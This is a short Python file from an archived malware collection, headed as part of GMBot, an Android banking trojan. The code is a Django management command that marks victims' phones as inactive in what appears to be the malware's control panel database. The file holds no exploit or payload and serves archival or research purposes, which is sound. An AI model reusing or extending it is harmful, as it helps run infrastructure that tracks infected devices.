# ------------------------------------------------------------
# name      GMBot
# type      android
# cve       —
# year      unknown
# os        Android
# authors   unknown
# source    RamadhanAmizudin/malware
# archived  RamadhanAmizudin, krisyotam (2026)
# notes     —
# ------------------------------------------------------------
import logging

from django.core.management import BaseCommand

from smsapp import models


logger = logging.getLogger(__name__)


class Command(BaseCommand):
    def handle(self, *args, **options):
        for p in models.PhoneData.objects.get_inactive_phones():
            p.inactive = True
            p.save()
            logger.debug("Phone {0} marked as inactive".format(p))
